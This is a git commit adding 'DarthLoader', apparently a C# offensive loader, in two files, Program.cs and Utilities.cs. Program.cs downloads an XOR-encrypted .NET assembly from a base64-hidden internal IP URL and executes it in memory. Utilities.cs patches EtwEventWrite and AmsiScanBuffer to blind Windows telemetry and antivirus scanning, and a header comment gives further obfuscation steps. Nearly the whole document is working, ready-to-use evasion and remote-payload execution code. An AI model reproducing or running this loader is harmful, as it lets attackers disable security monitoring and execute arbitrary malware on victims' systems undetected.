32cf9fb25bef3ceb8ad88f5d75f0da23a7496a99
d4ddyd4rth <49704708+d4ddyd4rth@users.noreply.github.com>
2022-10-03 15:31:41 -0500

    Add files via upload

---
+++ DarthLoader/Program.cs
@@ -0,0 +1,76 @@
+﻿// obfuscation:
+// python .\ProtectMyTooling.py asstrongasfuck,confuserex "D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release\DarthLoader.exe" D:\test.exe
+
+using System.Net;
+using System.Reflection;
+using System;
+using System.Threading;
+
+
+namespace DarthLoader
+{
+    class Program
+    {
+        static byte[] PrepareRemoteAssembly(string url, int count, string xorKey = "")
+        {
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            WebClient webClient = new WebClient();
+            byte[] programBytes = null;
+            while (count >= 0 && programBytes == null)
+            {
+                try
+                {
+                    programBytes = Utilities.Xor(webClient.DownloadData(url), xorKey);
+                }
+                catch (WebException)
+                {
+                    Console.WriteLine("[!] Assembly not found!");
+                    Console.WriteLine($"[+] Retrying download...");
+                    count--;
+                    Thread.Sleep(1000);
+                }
+            }
+            return programBytes;
+        }
+
+        // load, decrypt and execute assembly bytes
+        static void ExecuteAssembly(byte[] programBytes)
+        {
+            try
+            {
+                Assembly dotNetProgram = Assembly.Load(programBytes);
+                string[] parameters = new string[] { null }; // add params if needed
+                dotNetProgram.EntryPoint.Invoke(null, new object[] { parameters });
+            }
+            catch (TargetInvocationException)
+            {
+                Console.WriteLine("[!] Missing arguments for loaded assembly!");
+                Environment.Exit(-1);
+            }            
+        }
+
+        static void Main(string[] args)
+        {
+            try
+            {
+                string key = args[0];
+                string count = args[1];
+
+                Utilities.BypassETW();
+                Utilities.BypassAMSI();
+
+                Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {key}");
+                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode("aHR0cDovLzEwLjEwLjEuNDAvdXBkYXRlLmV4ZQ=="), Int32.Parse(count), key);
+                Console.WriteLine("[!] .Net assembly downloaded!");
+
+                Console.WriteLine("[*] Decrypting and executing assembly...");
+                ExecuteAssembly(Utilities.Xor(programBytes, key));
+            }
+            catch (IndexOutOfRangeException)
+            {
+                Console.WriteLine("[!] Missing argument Xor key or retry counter!");
+                Environment.Exit(-1);
+            }
+        }
+    }
+}
---
+++ DarthLoader/Utilities.cs
@@ -0,0 +1,121 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+
+namespace DarthLoader
+{
+    class Utilities
+    {
+        [DllImport("kernel32")]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static bool Is64Bit
+        {
+            get
+            {
+                return IntPtr.Size == 8;
+            }
+        }
+
+        static byte[] patch(string function)
+        {
+            byte[] patch;
+            if (function.ToLower() == Base64Decode("YnlwYXNzZXR3"))
+            {
+                if (Is64Bit)
+                {
+                    patch = new byte[2];
+                    patch[0] = 0xc3;
+                    patch[1] = 0x00;
+                }
+                else
+                {
+                    patch = new byte[3];
+                    patch[0] = 0xc2;
+                    patch[1] = 0x14;
+                    patch[2] = 0x00;
+                }
+                return patch;
+            }
+            else if (function.ToLower() == Base64Decode("YnlwYXNzYW1zaQ=="))
+            {
+                if (Is64Bit)
+                {
+                    patch = new byte[6];
+                    patch[0] = 0xB8;
+                    patch[1] = 0x57;
+                    patch[2] = 0x00;
+                    patch[3] = 0x07;
+                    patch[4] = 0x80;
+                    patch[5] = 0xC3;
+                }
+                else
+                {
+                    patch = new byte[8];
+                    patch[0] = 0xB8;
+                    patch[1] = 0x57;
+                    patch[2] = 0x00;
+                    patch[3] = 0x07;
+                    patch[4] = 0x80;
+                    patch[5] = 0xC2;
+                    patch[6] = 0x18;
+                    patch[7] = 0x00;
+
+                }
+                return patch;
+            }
+            else throw new ArgumentException("[!] Function is not supported...");
+        }
+
+        public static string Base64Decode(string base64EncodedData)
+        {
+            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
+        }
+
+        public static void BypassETW()
+        {
+            string traceloc = Base64Decode("bnRkbGwuZGxs");
+            string magicFunction = Base64Decode("RXR3RXZlbnRXcml0ZQ==");
+            IntPtr ntdllAddr = LoadLibrary(traceloc);
+            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
+            byte[] magicVoodoo = patch(Base64Decode("QnlwYXNzRVRX"));
+            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
+            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
+            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
+            Console.WriteLine("[+] ETW bypassed!");
+        }
+        public static void BypassAMSI()
+        {
+            string avloc = Base64Decode("YW1zaS5kbGw=");
+            string magicFunction = Base64Decode("QW1zaVNjYW5CdWZmZXI=");
+            IntPtr avAddr = LoadLibrary(avloc);
+            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
+            byte[] magicVoodoo = patch(Base64Decode("QnlwYXNzQU1TSQ=="));
+            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
+            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
+            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
+            Console.WriteLine("[+] AMSI bypassed!");
+        }
+
+        public static byte[] Xor(byte[] inputByteArray, string keyString)
+        {
+            byte[] key = Encoding.UTF8.GetBytes(keyString);
+            byte[] data = new byte[inputByteArray.Length];
+
+            for (int i = 0; i < inputByteArray.Length; i++)
+            {
+                data[i] = (byte)(inputByteArray[i] ^ key[i % key.Length]);
+            }
+            return data;
+        } 
+    }
+}
+
